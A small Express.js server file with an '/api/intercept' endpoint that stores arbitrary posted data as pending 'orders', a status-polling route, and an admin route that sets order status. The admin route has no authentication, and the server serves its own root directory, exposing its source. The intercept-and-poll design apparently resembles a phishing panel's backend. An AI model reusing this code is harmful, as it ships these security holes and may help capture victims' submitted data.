const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(express.json());

// Log all requests
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

// Mock database for orders
let orders = {};

// Intercept API
app.post('/api/intercept', (req, res) => {
    const data = req.body;
    const orderRef = data.order_ref || `ORD-${Date.now()}`;
    orders[orderRef] = { ...orders[orderRef], ...data, status: 'pending' };
    console.log(`Order ${orderRef} updated`);
    res.json({ success: true, orderRef: orderRef });
});

// Status Polling API
app.get('/api/orders/:ref/status', (req, res) => {
    const order = orders[req.params.ref];
    res.json({ status: order ? order.status : 'pending' });
});

// Admin API to change status (optional but useful)
app.post('/api/admin/update-status', (req, res) => {
    const { orderRef, status } = req.body;
    if (orders[orderRef]) {
        orders[orderRef].status = status;
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Order not found' });
    }
});

// Serve static files from 'assets'
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// Serve other static files from root
app.use(express.static(path.join(__dirname)));

// SPA routing
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
